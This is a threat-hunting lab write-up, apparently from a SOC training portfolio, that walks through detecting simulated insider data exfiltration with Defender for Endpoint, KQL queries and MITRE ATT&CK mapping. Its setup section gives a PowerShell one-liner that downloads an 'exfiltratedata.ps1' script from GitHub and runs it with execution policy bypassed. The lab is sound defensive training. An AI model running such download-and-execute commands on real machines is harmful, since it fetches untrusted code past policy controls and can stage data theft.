# 🕵️ Data Exfiltration Detection — Threat Hunting Scenario

**Tools Used:** Microsoft Sentinel · Microsoft Defender for Endpoint · Azure Virtual Machines · KQL · Log Analytics Workspace · MITRE ATT&CK Framework  
**Frameworks:** Threat Hunting Methodology · MITRE ATT&CK  
**Skills Demonstrated:** Insider Threat Hunting · File & Process Event Analysis · Network Exfiltration Detection · KQL Log Correlation · Behavioral Analysis

---

## 📋 Overview

An employee named **John Doe**, working in a sensitive department, was recently placed on a **Performance Improvement Plan (PIP)**. After a hostile reaction from John, management raised concerns that he may attempt to **steal proprietary company data** before resigning. This scenario simulates a proactive insider threat hunt on John's corporate device using **Microsoft Defender for Endpoint (MDE)** to determine whether any data theft or exfiltration activity occurred.

This scenario follows a structured **7-phase threat hunting methodology** and maps findings to the **MITRE ATT&CK Framework**.

---

## 🔧 Pre-Lab Setup

Before beginning, the following were provisioned and confirmed operational:

- ✅ Azure Virtual Machine created and onboarded to **Microsoft Defender for Endpoint (MDE)**
- ✅ The following PowerShell command was executed on the VM to simulate malicious data exfiltration activity:

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```

- ✅ Logs confirmed flowing into Log Analytics Workspace from:
  - `DeviceFileEvents`
  - `DeviceProcessEvents`
  - `DeviceNetworkEvents`

> 📸 **Screenshot:** *Azure portal showing VM running + MDE device inventory confirmation*

---

## Phase 1 — Preparation

### Hypothesis

> *"Could John Doe be compressing and exfiltrating sensitive company files from his corporate device to an external or personal destination?"*

**Environment Context:**
- John is an **administrator on his own device** with no application restrictions
- No DLP (Data Loss Prevention) controls are in place
- John has access to sensitive departmental files
- The combination of admin rights and unrestricted application use creates a high-risk insider threat scenario

**Potential MITRE ATT&CK TTPs to investigate:**
- T1560.001 — Archive Collected Data: Archive via Utility
- T1048 — Exfiltration Over Alternative Protocol
- T1059.001 — Command and Scripting Interpreter: PowerShell

---

## Phase 2 — Data Collection

### Objective
Confirm that relevant log sources are populated and available for analysis.

**Tables verified:**

| Table | Purpose |
|---|---|
| `DeviceProcessEvents` | Detect archive/compression tool execution |
| `DeviceFileEvents` | Identify files created, modified, or staged for exfiltration |
| `DeviceNetworkEvents` | Detect outbound connections to external destinations |

> 📸 **Screenshot:** *KQL query confirming recent logs exist across all three tables for the target VM*

---

## Phase 3 — Data Analysis

### Objective
Identify evidence of file archiving or compression activity that may indicate data staging for exfiltration.

**Step 1 — Hunt for archive/compression tool usage:**

```kql
let archive_applications = dynamic(["winrar.exe", "7z.exe", "winzip32.exe", "peazip.exe", "Bandizip.exe", "UniExtract.exe", "POWERARC.EXE", "IZArc.exe", "AshampooZIP.exe", "FreeArc.exe"]);
let VMName = "windows-target-"; // Replace with your VM name
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
```

**Findings:** One or more archive utilities were detected executing on `windows-target-` — confirming that compression activity occurred on John's device. Timestamp was recorded for pivoting into file and network events.

> 📸 **Screenshot:** *DeviceProcessEvents results showing archive tool execution with timestamp*

---

**Step 2 — Pivot to file events around the time of archive activity:**

```kql
let specificTime = datetime(2024-10-15T19:00:48.5615171Z); // Replace with your timestamp
let VMName = "windows-target-"; // Replace with your VM name
DeviceFileEvents
| where Timestamp between ((specificTime - 1m) .. (specificTime + 1m))
| where DeviceName == VMName
| order by Timestamp desc
```

**Findings:** File creation events were observed in close proximity to the archive tool execution — indicating files were being actively compressed and staged, consistent with data exfiltration preparation.

> 📸 **Screenshot:** *DeviceFileEvents results showing archive file creation near the timestamp*

---

**Step 3 — Check for outbound network activity around the same time:**

```kql
let VMName = "windows-target-"; // Replace with your VM name
let specificTime = datetime(2024-10-15T19:00:48.5615171Z); // Replace with your timestamp
DeviceNetworkEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```

**Findings:** Outbound network connections were observed shortly after the file archiving activity — suggesting the compressed files were transmitted to an external destination.

> 📸 **Screenshot:** *DeviceNetworkEvents showing outbound connections from the VM near the time of file archiving*

---

## Phase 4 — Investigation

### Objective
Correlate all three data sources to build a complete picture of the exfiltration chain and map to MITRE ATT&CK.

**Full Attack Chain Identified:**

1. 🟡 PowerShell script (`exfiltratedata.ps1`) downloaded and executed on John's device
2. 🟠 Archive utility invoked to compress sensitive files
3. 🔴 Compressed archive transmitted outbound to external destination

**MITRE ATT&CK Mapping:**

| Technique | ID | Evidence |
|---|---|---|
| Archive Collected Data: Archive via Utility | T1560.001 | Archive tool execution detected in DeviceProcessEvents |
| Exfiltration Over Alternative Protocol | T1048 | Outbound connection observed in DeviceNetworkEvents post-archiving |
| PowerShell Execution | T1059.001 | exfiltratedata.ps1 executed via bypass policy |
| Ingress Tool Transfer | T1105 | Script downloaded via Invoke-WebRequest |

> 📸 **Screenshot:** *MITRE ATT&CK Framework reference showing mapped techniques*

> 📸 **Screenshot:** *Side-by-side view of ProcessEvents → FileEvents → NetworkEvents timeline showing the full exfiltration chain*

---

## Phase 5 — Response

### Objective
Contain the threat and prevent further data loss.

**Actions taken / recommended:**

- 🔒 **Isolate the device** immediately via MDE to cut off any active exfiltration
- 🚫 **Revoke John's credentials** and disable his Active Directory/Entra ID account
- 🗑️ **Remove malicious script** — delete `C:\programdata\exfiltratedata.ps1`
- 🔍 **Determine what was exfiltrated** — identify file names, sizes, and destination IP/domain
- 📋 **Escalate to HR and Legal** — insider threat incidents require cross-functional response
- 🔎 **Preserve forensic evidence** — retain logs and disk image for potential legal proceedings

> 📸 **Screenshot:** *MDE device isolation confirmation screen*

---

## Phase 6 — Documentation

### Findings Summary

- **Root Cause:** A PowerShell exfiltration script was executed on an insider threat actor's corporate device, compressing and transmitting sensitive files to an external destination
- **Affected Host:** `windows-target-1` (John Doe's corporate device)
- **Attack Vector:** Unrestricted PowerShell execution + admin rights + no DLP controls
- **Evidence Sources:** DeviceProcessEvents (archive tool), DeviceFileEvents (compressed files), DeviceNetworkEvents (outbound transmission)
- **Outcome:** Exfiltration activity confirmed; device isolated and credentials revoked

> 📸 **Screenshot:** *Incident notes or documentation panel with full findings recorded*

---

## Phase 7 — Improvement

### Lessons Learned & Recommendations

| Gap Identified | Recommended Control |
|---|---|
| Unrestricted PowerShell execution | Enforce Constrained Language Mode or ASR rules |
| No DLP policy in place | Implement Microsoft Purview DLP to block sensitive file transfers |
| Admin rights for standard users | Apply principle of least privilege — remove local admin where unnecessary |
| No alerting on archive tool usage | Build Sentinel rule to alert when archive utilities execute on endpoints |
| No offboarding procedure triggered | Define HR-to-IT workflow to restrict access immediately when PIP is issued |

**Proposed Detection Rule (Future):**
A Sentinel Scheduled Query Rule using the archive application query could automatically alert any time a compression utility is executed on a corporate endpoint — converting this reactive hunt into a proactive detection capability.

---

## 🗂️ Summary

| Phase | Action Taken |
|---|---|
| Preparation | Hypothesis formed around insider threat compressing and exfiltrating data |
| Data Collection | Verified logs in DeviceFileEvents, DeviceProcessEvents, DeviceNetworkEvents |
| Data Analysis | Detected archive tool execution, file staging, and outbound network transfer |
| Investigation | Full exfiltration chain confirmed; mapped to 4 MITRE ATT&CK techniques |
| Response | Device isolated; credentials revoked; script removed; legal notified |
| Documentation | Findings, IOCs, timeline, and MITRE mappings recorded |
| Improvement | DLP, least privilege, and detection rule recommendations documented |

---

## 📁 Repository Structure

```
03-Data-Exfiltration-Detection/
│
├── README.md                              ← This file
├── screenshots/
│   ├── 01-vm-mde-onboarding.png
│   ├── 02-logs-confirmed-tables.png
│   ├── 03-archive-tool-process-events.png
│   ├── 04-file-events-archive-created.png
│   ├── 05-network-events-outbound.png
│   ├── 06-mitre-attack-mapping.png
│   ├── 07-full-exfiltration-timeline.png
│   ├── 08-device-isolation-mde.png
│   └── 09-findings-documented.png
└── queries/
    ├── archive_tool_detection.kql
    ├── file_events_pivot.kql
    └── network_events_pivot.kql
```

---

*Part of the [Threat-Hunting-Scenarios](../README.md) repository — a collection of hands-on SOC labs following real-world detection and response workflows.*
